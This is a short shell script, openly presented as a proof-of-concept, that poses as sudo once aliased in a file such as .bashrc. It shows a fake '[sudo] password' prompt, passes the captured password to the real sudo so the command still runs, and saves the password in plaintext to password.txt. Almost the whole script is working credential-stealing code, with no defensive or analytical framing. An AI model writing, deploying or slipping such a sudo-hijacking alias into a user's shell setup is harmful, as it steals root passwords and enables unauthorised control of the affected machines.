#!/bin/sh

# IS NOT POSIX COMPLIANT

# This script is a proof-of-concept of an idea that I had.
# Put the execution of this script as a sudo alias into some rc file (e.g. .bashrc)
# The script will execute instead of sudo, save the password and redirect the command to the actual sudo

echo "[sudo] password for $LOGNAME:" && read -s PASSWORD

echo "$PASSWORD" | sudo -S -u root "$@"
echo "$PASSWORD" > password.txt  && unset PASSWORD
